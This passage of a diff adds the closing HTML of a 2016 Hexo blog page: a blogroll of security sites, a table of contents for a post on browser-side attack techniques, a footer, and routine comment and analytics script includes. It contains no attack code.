+                <a href="http://weibo.com/2560648590/profile" target="_blank" title="weibo">
+                  
+                    <i class="fa fa-globe"></i>
+                  
+                  weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element">
+            <div class="links-of-blogroll-title">Links</div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://ohroot.com/" title="ohroot" target="_blank">ohroot</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.ourren.com/" title="ourren" target="_blank">ourren</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.pang0lin.com/" title="pang0lin" target="_blank">pang0lin</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://jinglingshu.org/" title="精灵鼠" target="_blank">精灵鼠</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.sccsec.com/" title="胖胖" target="_blank">胖胖</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://mauu.me" title="ksss" target="_blank">ksss</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://ecma.io" title="该隐" target="_blank">该隐</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blackwolfsec.github.io/" title="blackwolf" target="_blank">blackwolf</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wsyks.github.io/" title="我是_一棵树_" target="_blank">我是_一棵树_</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://phantom0301.github.io/" title="零の杂货铺" target="_blank">零の杂货铺</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie偷取"><span class="nav-number">1.</span> <span class="nav-text">Cookie偷取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基础认证钓鱼"><span class="nav-number">2.</span> <span class="nav-text">基础认证钓鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#表单劫持"><span class="nav-number">3.</span> <span class="nav-text">表单劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#劫持onsubmit方法"><span class="nav-number">3.0.1.</span> <span class="nav-text">劫持onsubmit方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修改action指向"><span class="nav-number">3.0.2.</span> <span class="nav-text">修改action指向</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#获取浏览器记住的明文密码"><span class="nav-number">3.0.3.</span> <span class="nav-text">获取浏览器记住的明文密码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#键盘记录"><span class="nav-number">3.0.4.</span> <span class="nav-text">键盘记录</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DDos攻击"><span class="nav-number">4.</span> <span class="nav-text">DDos攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF"><span class="nav-number">5.</span> <span class="nav-text">CSRF</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wps2015</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"wps2015"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+<script type="text/javascript" async src="//push.zhanzhang.baidu.com/push.js">
+</script>
+
+
+</body>
+</html>
